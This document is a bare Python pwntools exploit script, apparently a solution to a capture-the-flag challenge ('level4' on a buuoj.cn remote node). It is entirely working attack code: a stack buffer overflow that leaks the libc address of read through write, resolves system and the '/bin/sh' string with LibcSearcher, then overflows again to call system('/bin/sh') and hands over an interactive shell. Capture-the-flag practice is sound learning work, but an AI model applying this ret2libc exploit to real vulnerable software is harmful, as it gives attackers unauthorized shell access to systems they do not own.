from pwn import *
from LibcSearcher import *

context.os = "linux"
context.arch = "i386"

elf = ELF("./level4")
write_plt = elf.plt["write"]
read_got = elf.got["read"]

vuln_func = 0x804844b
payload1 = b'a'*(0x88+4) + p32(write_plt) + p32(vuln_func) + p32(1) + p32(read_got) + p32(4)

io = remote('node4.buuoj.cn', 29605)
io.send(payload1)

read_addr = u32(io.recv(4))
lb = LibcSearcher('read', read_addr)

system_addr = lb.dump('system') + read_addr - lb.dump('read')
binsh_addr = lb.dump('str_bin_sh') + read_addr - lb.dump('read')
payload2 = b'a'*(0x88+4) + p32(system_addr) + p32(0xdeadbeef) + p32(binsh_addr)

io.sendline(payload2)
io.interactive()

